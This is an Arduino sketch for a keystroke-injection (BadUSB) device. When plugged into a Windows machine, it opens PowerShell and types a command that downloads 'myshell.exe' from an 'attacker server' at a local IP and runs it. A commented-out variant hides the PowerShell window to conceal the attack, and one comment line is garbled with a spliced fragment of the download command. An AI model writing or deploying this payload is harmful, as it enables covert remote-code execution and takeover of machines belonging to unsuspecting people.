#include <Keyboard.h>

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI); // Windows Key
  Keyboard.press('r'); // r key
  Keyboard.releaseAll(); // release all keys

  delay(500);// delay of 500ms
  // Open PowerShell, Navigate to root directory, download shell script from attacker server, start shell script
  Keyboard.print("powershell");
  typeKey(KEY_RETURN); //Hit enter

    delay(500);// delay of 500ms
  // Navigate to root directorym.Net.WebClient).DownloadFile('http://192.168.1.21/myshell.exe','myshell.exe'); Start-Process "myshell.exe" 
  Keyboard.print("cd ~/");
  typeKey(KEY_RETURN); //Hit enter

  //download shell script from attacker server and start shell script
  delay(500);// delay of 500ms
  Keyboard.print("(new-object System.Net.WebClient).DownloadFile('http://192.168.1.21/myshell.exe','myshell.exe'); Start-Process \"myshell.exe\" ");
  // Hiding the PowerShell window
//  Keyboard.print("powershell -windowstyle hidden cd ~/; (new-object System.Net.WebClient).DownloadFile('http://192.168.1.21/myshell.exe','myshell.exe'); Start-Process \"myshell.exe\" ");

  typeKey(KEY_RETURN); //Hit enter


  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}